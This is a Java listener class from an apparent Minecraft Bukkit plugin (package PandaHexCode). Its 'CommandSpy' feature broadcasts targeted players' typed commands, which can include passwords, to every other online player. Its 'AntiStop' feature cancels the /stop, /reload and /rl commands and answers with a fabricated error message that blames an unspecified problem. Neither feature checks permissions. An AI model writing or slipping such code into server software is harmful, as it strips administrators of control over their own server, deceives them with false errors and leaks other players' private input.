package PandaHexCode.Listeners;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import PandaHexCode.Commands.*;

public class PlayerCommandPreprocessListener implements Listener{
	
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e) {
		Player p = e.getPlayer();
		for (Player pl : Bukkit.getOnlinePlayers()) {
			if(pl != p && StandartArrayCommands.commandspy.targetPlayers.contains(p.getName())) {
				pl.sendMessage("§7[§4§lCommandSpy§7] §e"+p.getName()+" §c> §e"+e.getMessage());
			}
		}
		
		if(AntiStop.enable) {
			String message = e.getMessage();
			if(message.startsWith("/stop") | message.startsWith("/reload") | message.startsWith("/rl")) {
				p.sendMessage("§cError when executing this command, if this error persists please contact the server support! For the security of your server you should not force stop the server, this could cause problems!");
				e.setCancelled(true);
			}
		}
	}
}
